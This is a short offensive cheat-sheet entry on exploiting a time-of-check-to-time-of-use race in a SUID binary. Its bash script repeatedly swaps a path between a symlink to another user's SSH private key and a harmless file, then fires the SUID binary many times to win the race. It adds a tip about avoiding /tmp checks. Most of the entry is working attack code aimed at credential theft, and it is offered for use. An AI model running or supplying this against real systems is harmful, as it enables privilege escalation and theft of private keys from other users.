# SUID Binary TOCTOU Race Condition

If a SUID binary checks a file path (permissions, symlink-ness, filename contents) and then opens it as a separate step, race the check against the open — swap a symlink in and out faster than the window between check and use.

```bash
# attacker: flip the target path between a symlink to the real secret and a harmless regular file
while true; do
  ln -sf /home/<target>/.ssh/id_rsa flip
  rm flip
  touch flip
done &

# fire many calls to win the race
for i in {1..50}; do /path/to/suid-binary flip; done
```
Do this in a directory you own (not `/tmp`, which some checks special-case) so the checks run against your symlink.
